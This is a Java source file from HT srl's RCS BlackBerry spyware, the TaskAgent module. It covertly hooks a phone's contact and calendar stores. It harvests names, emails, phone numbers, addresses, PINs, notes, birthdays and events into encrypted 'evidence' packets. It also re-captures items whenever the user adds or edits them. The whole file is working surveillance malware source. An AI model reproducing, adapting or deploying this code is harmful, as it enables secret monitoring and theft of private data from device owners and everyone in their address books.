//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ImAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;

import javax.microedition.pim.Contact;
import javax.microedition.pim.ContactList;
import javax.microedition.pim.Event;
import javax.microedition.pim.EventList;
import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMException;
import javax.microedition.pim.PIMItem;

import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryEvent;
import net.rim.blackberry.api.pdap.BlackBerryPIMList;
import net.rim.blackberry.api.pdap.PIMListListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.Markup;
import blackberry.fs.Path;
import blackberry.interfaces.UserAgent;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class ImAgent.
 */
public final class TaskAgent extends Agent implements PIMListListener,
        UserAgent {
    //#ifdef DEBUG
    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
    //#endif

    Markup markup;
    protected static final int SLEEPTIME = 3000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    private static final int POOM_STRING_SUBJECT = 0x01000000;
    private static final int POOM_STRING_CATEGORIES = 0x02000000;
    private static final int POOM_STRING_BODY = 0x04000000;
    private static final int POOM_STRING_RECIPIENTS = 0x08000000;
    private static final int POOM_STRING_LOCATION = 0x10000000;
    private static final int POOM_OBJECT_RECUR = 0x80000000;

    final int version = 0x01000000;

    /**
     * Instantiates a new Organizer agent. TaskAgent on Mobile
     * 
     * @param agentStatus
     *            the agent status
     */
    public TaskAgent(final boolean agentEnabled) {
        super(Agent.AGENT_TASK, agentEnabled, false, "TaskAgent");
    }

    /**
     * Instantiates a new im agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected TaskAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);

        //#ifdef DEBUG
        debug.trace("TaskAgent");
        //#endif

        markup = new Markup(agentId, Encryption.getKeys().getAesKey());

        parse(confParams);
        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);

        if (!enabled) {
            markup.removeMarkup();
        }
    }

    byte[] examplePacket;

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: add listener");
        //#endif

        final PIM pim = PIM.getInstance();
        BlackBerryPIMList list;
        try {
            list = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                    PIM.READ_ONLY);
            list.addListener(this);
            list = (BlackBerryPIMList) pim.openPIMList(PIM.EVENT_LIST,
                    PIM.READ_ONLY);
            list.addListener(this);
        } catch (final PIMException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

        //String pkt = "6a000000000000010100000100000000008044f82171cc0100e8085a2a71cc01000000000200000000000000000000000a000001500072006f007600610018000004450064006900740065006400200061006700610069006e000c0000104d0069006c0061006e006f00";
        //examplePacket = Utils.hexToByteArray(pkt, 0, pkt.length());
        //evidence.atomicWriteOnce(null, EvidenceType.CALENDAR, examplePacket);

    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: remove listener");
        //#endif

        final PIM pim = PIM.getInstance();
        BlackBerryPIMList list;
        try {
            list = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                    PIM.READ_ONLY);
            list.removeListener(this);
            list = (BlackBerryPIMList) pim.openPIMList(PIM.EVENT_LIST,
                    PIM.READ_ONLY);
            list.removeListener(this);
        } catch (final PIMException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif

        boolean haveToLoadContact = true, haveToLoadCalendar = true;
        boolean readSuccesfullyContact = false, readSuccesfullyCalendar = false;

        if (markup.isMarkup()) {
            byte[] ret;
            try {
                ret = markup.readMarkup();
                haveToLoadContact = ret[0] == 1;
                haveToLoadCalendar = ret[1] == 1;
            } catch (IOException ex) {
                //#ifdef DEBUG
                debug.error("actualRun: " + ex);
                //#endif
            }
        }

        if (haveToLoadContact) {
            readSuccesfullyContact = getContactList();
        }

        if (haveToLoadCalendar) {
            readSuccesfullyCalendar = getCalendarList();
        }

        if (readSuccesfullyContact|| readSuccesfullyCalendar) {
            markup.writeMarkup(new byte[] {
                    (byte) (readSuccesfullyContact ? 0 : 1),
                    (byte) (readSuccesfullyCalendar ? 0 : 1) });
        }
    }

    private boolean getContactList() {
        ContactList contactList;
        int number = 0;

        String[] lists = PIM.getInstance().listPIMLists(PIM.CONTACT_LIST);
        //#ifdef DEBUG
        debug.trace("actualRun lists: " + lists.length);
        //#endif

        boolean ret = true;

        for (int i = 0; i < lists.length; i++) {
            try {
                String name = lists[i];
                //#ifdef DEBUG
                debug.trace("actualRun: opening " + name);
                //#endif
                contactList = (ContactList) PIM.getInstance().openPIMList(
                        PIM.CONTACT_LIST, PIM.READ_ONLY, name);

                number = saveContactEvidence(contactList);
                //#ifdef DEBUG
                debug.trace("actualRun: saved " + number);
                //#endif

            } catch (final PIMException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif

                ret = false;
            }
        }
        return ret;

    }

    private boolean getCalendarList() {
        EventList calendarList;
        int number = 0;

        String[] lists = PIM.getInstance().listPIMLists(PIM.EVENT_LIST);
        //#ifdef DEBUG
        debug.trace("actualRun lists: " + lists.length);
        //#endif

        boolean ret = true;

        for (int i = 0; i < lists.length; i++) {
            try {
                String name = lists[i];
                //#ifdef DEBUG
                debug.trace("actualRun: opening " + name);
                //#endif
                calendarList = (EventList) PIM.getInstance().openPIMList(
                        PIM.EVENT_LIST, PIM.READ_ONLY, name);

                number = saveEventEvidence(calendarList);
                //#ifdef DEBUG
                debug.trace("actualRun: saved " + number);
                //#endif

            } catch (final PIMException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif

                ret = false;
            }
        }
        return ret;

    }

    private int saveContactEvidence(ContactList contactList)
            throws PIMException {
        final Enumeration eContacts = contactList.items();

        //#ifdef DEBUG
        debug.trace("saveContactEvidence: got contacts");
        //#endif

        evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);

        Contact contact;
        int number = 0;
        while (eContacts.hasMoreElements()) {
            //#ifdef DEBUG
            debug.trace("saveContactEvidence: contact #" + ++number);
            //#endif
            try {
                contact = (Contact) eContacts.nextElement();
                final byte[] packet = getContactPacket(contactList, contact);
                evidence.writeEvidence(packet);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("saveContactEvidence: finished contacts. Total: " + number);
        //#endif
        evidence.close();

        return number;
    }

    private int saveEventEvidence(EventList eventList) throws PIMException {
        final Enumeration eEvents = eventList.items();

        //#ifdef DEBUG
        debug.trace("saveEventEvidence: got calendar");
        //#endif

        evidence.createEvidence(null, EvidenceType.CALENDAR);

        BlackBerryEvent event;
        int number = 0;
        while (eEvents.hasMoreElements()) {
            //#ifdef DEBUG
            debug.trace("saveEventEvidence: event #" + ++number);
            //#endif
            try {
                event = (BlackBerryEvent) eEvents.nextElement();
                final byte[] packet = getEventPacket(eventList, event);
                evidence.writeEvidence(packet);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("saveEventEvidence: finished events. Total: " + number);
        //#endif
        evidence.close();

        return number;
    }

    /**
     * HomeAddressStreet = 0x21, HomeAddressCity = 0x22, HomeAddressState =
     * 0x23, HomeAddressPostalCode = 0x24, HomeAddressCountry = 0x25,
     * OtherAddressStreet = 0x26, OtherAddressCity = 0x27, OtherAddressState =
     * 0x2F, OtherAddressPostalCode = 0x28, OtherAddressCountry = 0x29,
     * BusinessAddressStreet = 0x2A, BusinessAddressCity = 0x2B,
     * BusinessAddressState = 0x2C, BusinessAddressPostalCode = 0x2D,
     * BusinessAddressCountry = 0x2E,
     * 
     * @param contactList
     * @param version
     * @param contact
     * @return
     */
    private byte[] getContactPacket(ContactList contactList, Contact contact) {

        //final byte[] header = new byte[12];
        //final byte[] payload = new byte[12];

        final DataBuffer dbPayload = new DataBuffer(false);
        initCustomFields();

        final String[] categories = contact.getCategories();
        for (int i = 0; i < categories.length; i++) {
            //#ifdef DEBUG
            debug.trace("getContactPacket cat: " + categories[i]);
            //#endif
        }

        int uid = 0;

        if (contactList.isSupportedField(Contact.UID)) {
            if (contact.countValues(Contact.UID) > 0) {
                final String suid = contact.getString(Contact.UID, 0);
                //#ifdef DEBUG
                debug.trace("actualRun uid: " + suid);
                //#endif
                try {
                    uid = Integer.parseInt(suid);
                } catch (final NumberFormatException ex) {
                    //#ifdef DEBUG
                    debug.error(ex);
                    //#endif
                }
            }
        }

        dbPayload.writeInt(0);
        dbPayload.writeInt(version);
        dbPayload.writeInt(uid);

        //#ifdef DEBUG
        debug.trace("getContactPacket: name");
        //#endif
        if (contactList.isSupportedField(Contact.NAME)) {
            if (contact.countValues(Contact.NAME) > 0) {
                final String[] names = contact.getStringArray(Contact.NAME, 0);

                addField(dbPayload, names, Contact.NAME_GIVEN, (byte) 0x01);
                addField(dbPayload, names, Contact.NAME_FAMILY, (byte) 0x02);
            }
        }

        //#ifdef DEBUG
        debug.trace("getContactPacket: email");
        //#endif
        addEmailField(contactList, contact, dbPayload, Contact.EMAIL,
                new byte[] { 0x06, 0x0D, 0x0F });

        //#ifdef DEBUG
        debug.trace("getContactPacket: tel");
        //#endif
        addTelField(contactList, contact, dbPayload, Contact.TEL, (byte) 0x07);

        //#ifdef DEBUG
        debug.trace("getContactPacket: addr");
        //#endif
        if (contactList.isSupportedField(Contact.ADDR)) {
            int numAddress = contact.countValues(Contact.ADDR);

            //#ifdef DEBUG
            debug.trace("getContactPacket, num addresses: " + numAddress);
            //#endif

            for (int i = 0; i < numAddress; i++) {
                final String[] addr = contact.getStringArray(Contact.ADDR, i);

                int attribute = contact
                        .getAttributes(BlackBerryContact.ADDR, i);
                if (attribute == BlackBerryContact.ATTR_HOME) {
                    //#ifdef DEBUG
                    debug.trace("getContactPacket addr home");
                    //#endif

                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
                            (byte) 0x22);
                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x23);
                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
                            (byte) 0x24);
                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x25);

                } else if (attribute == BlackBerryContact.ATTR_WORK) {
                    //#ifdef DEBUG
                    debug.trace("getContactPacket addr work");
                    //#endif
                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x2A);
                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
                            (byte) 0x2B);
                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2C);
                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
                            (byte) 0x2D);
                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2E);
                } else {
                    //#ifdef DEBUG
                    debug.trace("getContactPacket addr other");
                    //#endif
                    addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x26);
                    addField(dbPayload, addr, Contact.ADDR_LOCALITY,
                            (byte) 0x26);
                    addField(dbPayload, addr, Contact.ADDR_REGION, (byte) 0x2F);
                    addField(dbPayload, addr, Contact.ADDR_POSTALCODE,
                            (byte) 0x28);
                    addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x29);
                }

                addField(dbPayload, addr, Contact.ADDR_POBOX, (byte) 0x2D);
                addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);

            }
        }

        //#ifdef DEBUG
        debug.trace("getContactPacket: pin");
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.PIN, "PIN: ");

        //#ifdef DEBUG
        debug.trace("getContactPacket: users");
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.USER1, "USER1: ");
        addCustomField(contactList, contact, BlackBerryContact.USER2, "USER2: ");
        addCustomField(contactList, contact, BlackBerryContact.USER3, "USER3: ");
        addCustomField(contactList, contact, BlackBerryContact.USER4, "USER4: ");

        //#ifdef DEBUG
        debug.trace("getContactPacket: org");
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.ORG,
                "Organization: ");

        //#ifdef DEBUG
        debug.trace("getContactPacket: note");
        //#endif
        addCustomField(contactList, contact, BlackBerryContact.NOTE, "Note: ");

        //#ifdef DEBUG
        debug.trace("getContactPacket: anniversary");
        //#endif
        addCustomDateField(contactList, contact, BlackBerryContact.ANNIVERSARY,
                "Anniversary: ");

        //#ifdef DEBUG
        debug.trace("getContactPacket: birthday");
        //#endif
        addCustomDateField(contactList, contact, BlackBerryContact.BIRTHDAY,
                "Birthday: ");

        finalizeCustomFields(dbPayload);

        final int size = dbPayload.getLength();

        //#ifdef DEBUG

        debug.trace("size len: " + size);
        //#endif        

        // a questo punto il payload e' pronto, scriviamo la size
        //dbPayload.trim(true);
        dbPayload.rewind();
        dbPayload.writeInt(size);

        byte[] packet = dbPayload.toArray();

        //#ifdef DEBUG
        debug.trace("packet: " + Utils.byteArrayToHex(packet));
        //#endif                

        return packet;
    }

    private byte[] getEventPacket(EventList events, BlackBerryEvent event) {
        String summary = null, location = null, note = null;
        Date start = null, end = null, revision;
        int alarm, classEvent;
        int uid = 0;

        String uidEvent = getCalendarStringField(events, event, Event.UID);
        uid = Encryption.CRC32(uidEvent.getBytes());

        summary = getCalendarStringField(events, event, Event.SUMMARY);
        location = getCalendarStringField(events, event, Event.LOCATION);
        note = getCalendarStringField(events, event, Event.NOTE);

        long startLong = getCalendarDateField(events, event, Event.START);
        start = new Date(startLong);

        long endLong = getCalendarDateField(events, event, Event.END);
        end = new Date(endLong);

        long revisionLong = getCalendarDateField(events, event, Event.REVISION);
        revision = new Date(revisionLong);

        final DataBuffer dbPayload = new DataBuffer(false);

        dbPayload.writeInt(0);
        dbPayload.writeInt(version);
        dbPayload.writeInt(uid);

        int flags = 0;
        int sensitivity = 0;
        int busy = 2;
        int duration = 0;
        int meeting = 0;

        dbPayload.writeInt(flags);
        dbPayload.writeLong(DateTime.getFiledate(start));
        dbPayload.writeLong(DateTime.getFiledate(end));
        dbPayload.writeInt(sensitivity);
        dbPayload.writeInt(busy);
        dbPayload.writeInt(duration);
        dbPayload.writeInt(meeting);

        appendCalendarString(dbPayload, POOM_STRING_SUBJECT, summary);
        appendCalendarString(dbPayload, POOM_STRING_BODY, note);
        appendCalendarString(dbPayload, POOM_STRING_LOCATION, location);

        //#ifdef DEBUG
        debug.trace("getEventPacket: Adding " + summary + " body: " + note
                + " location: " + location);
        //#endif

        int size = dbPayload.getLength();
        //dbPayload.trim(true);

        dbPayload.rewind();
        dbPayload.writeInt(size);

        byte[] packet = dbPayload.toArray();

        //#ifdef DEBUG
        debug.trace("packet: " + Utils.byteArrayToHex(packet));
        //#endif                

        return packet;
    }

    private long getCalendarDateField(EventList events, BlackBerryEvent event,
            int type) {
        long ret = 0;
        try {
            if (events.isSupportedField(type)) {
                ret = event.getDate(type, PIMItem.ATTR_NONE);
                //#ifdef DEBUG
                debug.trace("getCalendarDateField: " + ret);
                //#endif
            }
        } catch (IndexOutOfBoundsException ex) {
            //#ifdef DEBUG
            debug.error("getCalendarStringField: " + ex);
            //#endif
        }

        return ret;
    }

    private String getCalendarStringField(EventList events,
            BlackBerryEvent event, int type) {
        String ret = null;
        try {
            if (events.isSupportedField(type)) {
                ret = event.getString(type, PIMItem.ATTR_NONE);
                //#ifdef DEBUG
                debug.trace("getCalendarStringField: " + ret);
                //#endif
            }
        } catch (IndexOutOfBoundsException ex) {
            //#ifdef DEBUG
            debug.error("getCalendarStringField: " + ex);
            //#endif
        }

        return ret;
    }

    private void appendCalendarString(DataBuffer payload, int type,
            String message) {
        if (message != null) {
            byte[] data = WChar.getBytes(message, false);
            int len = type | (data.length & 0x00ffffff);
            byte[] prefix = Utils.intToByteArray(len);
            payload.write(prefix);
            payload.write(data);
        }
    }

    private void addField(DataBuffer dbPayload, String[] fields,
            int fieldNumber, byte logType) {

        try {
            if (fields[fieldNumber] != null) {
                final String value = fields[fieldNumber];
                Utils.addTypedString(dbPayload, logType, value);
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

    }

    /*
     * private void addField(ContactList contactList, Contact contact,
     * DataBuffer dbPayload, int contactType, byte logType) { if
     * (name[Contact.NAME_GIVEN] != null) { String first =
     * name[Contact.NAME_GIVEN]; Utils.addTypedString(db_payload, (byte) 0x01,
     * first); } if (contactList.isSupportedField(contactType)) { if
     * (contact.countValues(contactType) >= 0) { String value =
     * contact.getString(contactType, 0); //#ifdef DEBUG
     * debug.trace("addField: " + contactType + "," + logType + " " + value);
     * //#endif Utils.addTypedString(dbPayload, logType, value); } } }
     */
    private void addEmailField(ContactList contactList, Contact contact,
            DataBuffer dbPayload, int contactType, byte[] logTypes) {

        if (contactList.isSupportedField(contactType)) {
            try {
                final int preferred = contact.getPreferredIndex(contactType);
                //#ifdef DEBUG
                debug.trace("addStringField preferred : " + preferred);
                //#endif           

                for (int i = 0; i < contact.countValues(contactType)
                        && i < logTypes.length; i++) {
                    final String value = contact.getString(contactType, i);
                    //#ifdef DEBUG
                    debug.trace("addStringField: " + logTypes[i] + " " + value);
                    //#endif
                    Utils.addTypedString(dbPayload, logTypes[i], value);
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    StringBuffer customBuffer = new StringBuffer();

    /**
     * La cosole accetta un solo custom field, quindi deve essere simulato
     * costruendo una stringa da serializzare solo nella finalize
     */
    private void initCustomFields() {
        //#ifdef DEBUG
        debug.trace("initCustomFields");
        //#endif
        customBuffer = new StringBuffer();
    }

    private void finalizeCustomFields(DataBuffer dbPayload) {
        //#ifdef DEBUG
        debug.trace("finalizeCustomFields");
        //#endif

        if (customBuffer == null) {
            //#ifdef DEBUG
            debug.error("finishCustomFields");
            //#endif
        } else {
            try {
                //#ifdef DEBUG
                debug.trace("finishCustomFields: " + customBuffer.toString());
                //#endif
                Utils.addTypedString(dbPayload, (byte) 0x37,
                        customBuffer.toString());
            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("finalizeCustomFields: " + ex);
                //#endif
            }
        }
    }

    protected void addCustomField(ContactList contactList, Contact contact,
            int contactType, String typeName) {

        if (contactList.isSupportedField(contactType)) {
            try {

                if (contact.countValues(contactType) > 0) {
                    final String value = contact.getString(contactType, 0);
                    customBuffer.append(typeName + value + "\r\n");
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    protected void addCustomDateField(ContactList contactList, Contact contact,
            int contactType, String typeName) {

        if (contactList.isSupportedField(contactType)) {
            try {

                if (contact.countValues(contactType) > 0) {
                    final long value = contact.getDate(contactType, 0);
                    customBuffer.append(typeName + (new Date(value)).toString()
                            + "\r\n");
                }

            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    protected void addTelField(ContactList contactList, Contact contact,
            DataBuffer dbPayload, int contactType, byte logType) {

        if (contactList.isSupportedField(contactType)) {
            try {
                final int preferred = contact.getPreferredIndex(contactType);
                //#ifdef DEBUG
                debug.trace("addStringField preferred : " + preferred);
                //#endif

                if (contact.countValues(contactType) > 0) {
                    final String value = contact.getString(contactType, 0);
                    Utils.addTypedString(dbPayload, logType, value);
                }

                String note = "";
                final int last = contact.countValues(contactType) - 1;
                for (int i = 1; i <= last; i++) {
                    final String value = contact.getString(contactType, i);
                    //#ifdef DEBUG
                    debug.trace("addStringField: " + logType + " " + value);
                    //#endif

                    note += value;
                    if (i < last) {
                        note += ", ";
                    }
                }

                //#ifdef DEBUG
                debug.trace("addTelField note: " + note);
                //#endif

                Utils.addTypedString(dbPayload, (byte) 0x34, note);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif
        return true;
    }

    public void itemAdded(PIMItem item) {
        init();
        //#ifdef DEBUG
        debug.trace("itemAdded: " + item);
        //#endif
        save(item);
    }

    public void itemRemoved(PIMItem item) {
        init();
        //#ifdef DEBUG
        debug.trace("itemRemoved: " + item);
        //#endif
    }

    public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
        init();
        //#ifdef DEBUG
        debug.trace("itemUpdated: " + itemNew);
        //#endif

        save(itemNew);
    }

    private void save(PIMItem item) {
        try {
            if (item instanceof Contact) {
                final ContactList contactList = (ContactList) item.getPIMList();
                final BlackBerryContact contact = (BlackBerryContact) item;
                final byte[] payload = getContactPacket(contactList, contact);

                evidence.atomicWriteOnce(null, EvidenceType.ADDRESSBOOK,
                        payload);
            } else if (item instanceof Event) {
                final EventList eventList = (EventList) item.getPIMList();
                final BlackBerryEvent event = (BlackBerryEvent) item;
                final byte[] payload = getEventPacket(eventList, event);

                evidence.atomicWriteOnce(null, EvidenceType.CALENDAR, payload);
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
}
